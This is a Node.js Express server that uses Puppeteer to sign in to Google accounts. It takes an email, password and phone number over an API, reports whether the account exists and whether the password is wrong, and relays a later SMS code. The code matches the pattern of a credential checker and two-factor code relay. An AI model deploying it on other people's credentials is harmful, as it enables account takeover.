const express = require("express");
const puppeteer = require("puppeteer-core");
const chromium = require("@sparticuz/chromium");

const app = express();
app.use(express.json());

// Store active sessions
const sessions = new Map();

// Optional API key authentication
const API_KEY = process.env.API_KEY;
app.use((req, res, next) => {
  if (API_KEY && req.headers["x-api-key"] !== API_KEY) {
    return res.status(401).json({ error: "Unauthorized" });
  }
  next();
});

// Start verification process with better error handling
app.post("/start-verification", async (req, res) => {
  const { emailAddress, smsPhone, password, domain } = req.body;
  const sessionId = Date.now().toString();

  try {
    // Launch browser
    const browser = await puppeteer.launch({
      args: [...chromium.args, "--no-sandbox", "--disable-setuid-sandbox"],
      defaultViewport: chromium.defaultViewport,
      executablePath: await chromium.executablePath(),
      headless: chromium.headless,
    });

    const page = await browser.newPage();

    // Add better error tracking
    page.on("console", (msg) => console.log("Browser console:", msg.text()));

    // Store session
    sessions.set(sessionId, {
      browser,
      page,
      emailAddress,
      status: "started",
      createdAt: Date.now(),
    });

    // Navigate to Google sign-in
    await page.goto("https://accounts.google.com/signin/v2/identifier", {
      waitUntil: "networkidle2",
      timeout: 30000,
    });

    // Wait for and enter email
    await page.waitForSelector('input[type="email"]', {
      visible: true,
      timeout: 10000,
    });
    await page.type('input[type="email"]', emailAddress, { delay: 100 });

    // Click next
    await Promise.all([
      page.waitForNavigation({ waitUntil: "networkidle0", timeout: 15000 }),
      page.click("#identifierNext"),
    ]);

    // Take screenshot for debugging
    const debugScreenshot = await page.screenshot({ encoding: "base64" });

    // Check what screen we're on
    const pageContent = await page.content();
    const pageUrl = page.url();

    // Multiple password field selectors (Google changes these)
    const passwordSelectors = [
      'input[type="password"]',
      'input[name="password"]',
      'input[name="Passwd"]',
      "#password input",
      'input[autocomplete="current-password"]',
    ];

    let passwordField = null;
    for (const selector of passwordSelectors) {
      passwordField = await page.$(selector);
      if (passwordField) break;
    }

    // Check for common intermediate screens
    if (pageContent.includes("Couldn't find your Google Account")) {
      await browser.close();
      sessions.delete(sessionId);
      return res.status(400).json({
        status: "error",
        message: "Email address not found",
      });
    }

    if (pageContent.includes("Choose an account")) {
      // Account selector screen - click the account
      const accountElement = await page.$(`div[data-email="${emailAddress}"]`);
      if (accountElement) {
        await accountElement.click();
        await page.waitForNavigation({ waitUntil: "networkidle0" });
        // Try to find password field again
        for (const selector of passwordSelectors) {
          passwordField = await page.$(selector);
          if (passwordField) break;
        }
      }
    }

    if (pageContent.includes("captcha") || pageContent.includes("recaptcha")) {
      await browser.close();
      sessions.delete(sessionId);
      return res.status(400).json({
        status: "error",
        message: "CAPTCHA detected - cannot automate",
        screenshot: debugScreenshot,
      });
    }

    if (!passwordField) {
      // Password field not found - return debug info
      await browser.close();
      sessions.delete(sessionId);
      return res.status(500).json({
        status: "error",
        message: "Password field not found",
        currentUrl: pageUrl,
        screenshot: debugScreenshot,
        pageTitle: await page.title(),
      });
    }

    // Enter password
    await passwordField.type(password, { delay: 100 });

    // Click next
    await Promise.all([
      page.waitForNavigation({ waitUntil: "networkidle0", timeout: 15000 }),
      page.click("#passwordNext"),
    ]);

    // Check for wrong password
    const errorElement = await page.$('[aria-live="assertive"]');
    if (errorElement) {
      const errorText = await page.evaluate(
        (el) => el.textContent,
        errorElement
      );
      if (errorText.includes("Wrong password")) {
        await browser.close();
        sessions.delete(sessionId);
        return res.status(400).json({
          status: "error",
          message: "Wrong password",
        });
      }
    }

    // Rest of the original code for phone verification...
    await page.waitForTimeout(2000); // Give page time to settle

    const newPageContent = await page.content();
    const newPageUrl = page.url();

    const needsPhone =
      newPageContent.includes("Verify it") ||
      newPageContent.includes("phone number") ||
      newPageContent.includes("Confirm your recovery phone number");

    if (needsPhone) {
      // Phone verification flow...
      const phoneInput =
        (await page.$('input[type="tel"]')) ||
        (await page.$('input[id*="phoneNumber"]'));

      if (phoneInput) {
        await phoneInput.click({ clickCount: 3 });
        await phoneInput.type(smsPhone, { delay: 100 });

        const nextButton =
          (await page.$('button[jsname="LgbsSe"]')) ||
          (await page.$('button span:has-text("Next")'));

        if (nextButton) {
          await nextButton.click();
        } else {
          await page.keyboard.press("Enter");
        }

        await page.waitForSelector(
          'input[type="tel"], input[type="text"], input[id*="idvPin"]',
          {
            visible: true,
            timeout: 10000,
          }
        );
      }

      sessions.get(sessionId).status = "awaiting_code";

      res.json({
        sessionId,
        status: "awaiting_sms_code",
        message: "Password accepted. SMS sent to phone.",
      });
    } else if (newPageUrl.includes("myaccount.google.com")) {
      // Success
      await browser.close();
      sessions.delete(sessionId);

      res.json({
        status: "success",
        message: "Login successful, no phone verification needed",
      });
    } else {
      // Unknown state
      const unknownScreenshot = await page.screenshot({ encoding: "base64" });
      sessions.get(sessionId).status = "unknown";

      res.json({
        sessionId,
        status: "unknown_state",
        message: "Logged in but in unexpected state",
        currentUrl: newPageUrl,
        screenshot: unknownScreenshot,
      });
    }
  } catch (error) {
    console.error("Error in start-verification:", error);

    if (sessions.has(sessionId)) {
      try {
        // Take error screenshot before closing
        const errorScreenshot = await sessions
          .get(sessionId)
          .page.screenshot({ encoding: "base64" });
        await sessions.get(sessionId).browser.close();
        sessions.delete(sessionId);

        return res.status(500).json({
          status: "error",
          message: error.message,
          screenshot: errorScreenshot,
        });
      } catch (e) {
        // If screenshot fails, just return error
      }
    }

    res.status(500).json({
      status: "error",
      message: error.message,
      details: error.stack,
    });
  }
});

// Submit SMS code
app.post("/submit-code", async (req, res) => {
  const { sessionId, smsCode } = req.body;

  if (!sessions.has(sessionId)) {
    return res.status(404).json({
      status: "error",
      message: "Session not found or expired",
    });
  }

  const session = sessions.get(sessionId);

  try {
    const { page, browser } = session;

    // Find code input - Google uses different selectors
    const codeInput =
      (await page.$('input[type="tel"]')) ||
      (await page.$('input[type="text"]')) ||
      (await page.$('input[id*="idvPin"]'));

    if (!codeInput) {
      throw new Error("SMS code input field not found");
    }

    // Clear and enter code
    await codeInput.click({ clickCount: 3 });
    await page.keyboard.type(smsCode, { delay: 100 });

    // Submit code
    const submitButton =
      (await page.$('button[jsname="LgbsSe"]')) ||
      (await page.$('div[data-mdc-dialog-action="next"]'));

    if (submitButton) {
      await submitButton.click();
    } else {
      await page.keyboard.press("Enter");
    }

    // Wait for result
    await page.waitForNavigation({ waitUntil: "networkidle2", timeout: 15000 });

    const finalUrl = page.url();
    const finalContent = await page.content();

    // Check if verification successful
    const success =
      finalUrl.includes("myaccount.google.com") ||
      finalContent.includes("Google Account") ||
      (!finalContent.includes("Wrong code") &&
        !finalContent.includes("Try again"));

    // Clean up
    await browser.close();
    sessions.delete(sessionId);

    if (success) {
      res.json({
        status: "success",
        message: "Phone verification completed successfully",
      });
    } else {
      res.json({
        status: "error",
        message: "Invalid code or verification failed",
      });
    }
  } catch (error) {
    console.error("Error in submit-code:", error);

    try {
      await session.browser.close();
    } catch (e) {}
    sessions.delete(sessionId);

    res.status(500).json({
      status: "error",
      message: error.message,
    });
  }
});

// Test endpoint to check what happens after email entry
app.post("/test-login", async (req, res) => {
  const { emailAddress } = req.body;

  try {
    const browser = await puppeteer.launch({
      args: [...chromium.args, "--no-sandbox", "--disable-setuid-sandbox"],
      defaultViewport: chromium.defaultViewport,
      executablePath: await chromium.executablePath(),
      headless: chromium.headless,
    });

    const page = await browser.newPage();

    await page.goto("https://accounts.google.com/signin/v2/identifier", {
      waitUntil: "networkidle2",
    });

    await page.waitForSelector('input[type="email"]', { visible: true });
    await page.type('input[type="email"]', emailAddress, { delay: 100 });

    await Promise.all([
      page.waitForNavigation({ waitUntil: "networkidle0" }),
      page.click("#identifierNext"),
    ]);

    // Take screenshot of what appears after email
    const screenshot = await page.screenshot({ encoding: "base64" });
    const pageUrl = page.url();
    const pageTitle = await page.title();

    await browser.close();

    res.json({
      status: "test_complete",
      currentUrl: pageUrl,
      pageTitle: pageTitle,
      screenshot: screenshot,
    });
  } catch (error) {
    res.status(500).json({
      status: "error",
      message: error.message,
    });
  }
});

// Cancel session
app.post("/cancel-session", async (req, res) => {
  const { sessionId } = req.body;

  if (sessions.has(sessionId)) {
    try {
      await sessions.get(sessionId).browser.close();
    } catch (e) {}
    sessions.delete(sessionId);
  }

  res.json({ status: "cancelled" });
});

// Get session status
app.get("/session-status/:sessionId", (req, res) => {
  const { sessionId } = req.params;

  if (!sessions.has(sessionId)) {
    return res.status(404).json({
      status: "error",
      message: "Session not found",
    });
  }

  const session = sessions.get(sessionId);
  res.json({
    status: session.status,
    emailAddress: session.emailAddress,
    age: Date.now() - session.createdAt,
  });
});

// Health check
app.get("/health", (req, res) => {
  res.json({
    status: "healthy",
    activeSessions: sessions.size,
    uptime: process.uptime(),
  });
});

// Root endpoint
app.get("/", (req, res) => {
  res.json({
    service: "Google Account Verification API",
    endpoints: {
      "POST /start-verification": "Start verification process",
      "POST /submit-code": "Submit SMS verification code",
      "POST /test-login": "Test login to see what screen appears",
      "POST /cancel-session": "Cancel active session",
      "GET /session-status/:id": "Check session status",
      "GET /health": "Health check",
    },
  });
});

const PORT = process.env.PORT || 3000;
const SESSION_TIMEOUT = parseInt(process.env.SESSION_TIMEOUT) || 300000; // 5 minutes

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

// Cleanup hanging sessions
setInterval(async () => {
  for (const [id, session] of sessions.entries()) {
    if (Date.now() - session.createdAt > SESSION_TIMEOUT) {
      console.log(`Cleaning up expired session ${id}`);
      try {
        await session.browser.close();
      } catch (e) {}
      sessions.delete(id);
    }
  }
}, 60000); // Check every minute

// Graceful shutdown
process.on("SIGINT", async () => {
  console.log("Shutting down gracefully...");
  for (const [id, session] of sessions.entries()) {
    try {
      await session.browser.close();
    } catch (e) {}
  }
  process.exit(0);
});
